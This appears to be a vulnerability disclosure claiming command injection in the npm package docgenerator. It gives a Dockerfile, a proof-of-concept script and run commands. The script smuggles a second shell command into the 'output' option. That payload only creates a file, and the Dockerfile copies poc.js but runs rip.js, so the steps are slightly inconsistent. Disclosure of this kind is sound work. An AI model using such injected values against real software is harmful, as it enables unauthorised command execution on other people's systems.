@docgenerator is vulnerable to command injection

[Npm Package](https://www.npmjs.com/package/docgenerator)

# Steps To Reproduce
* Create a new Dockerfile container

```
# Dockerfile
FROM node:10-slim
WORKDIR /exploitation
RUN npm i docgenerator
COPY poc.js /exploitation/poc.js
ENTRYPOINT ls -l ; node rip.js ; ls -l 
```
* Create the file rip.js using the following code:

```
var generator = require( 'docgenerator' ),
    path = require( 'path' ),
    fs = require( 'fs' );

// Get all the markdown files in this folder
var files = fs.readdirSync( '.' );

files = files
    .filter( function( file ) {
        return file.substr( -3 ) === '.md';
    })
    .sort();

generator
    .set( 'title', 'Official documentation of tartempion' )
    .set( 'toc', true )
    .set( 'table', true )
    .set( 'files', files )
    .set( 'output', 'documentation.html; $(touch /exploitation/bitcoinMiner.txt)' )
    .generate();
    
 ```
 
  * Build and Run the container with the following commands:
  ```
  $ docker build . -t docsExploit
  $ docker run docsExploit
  ```
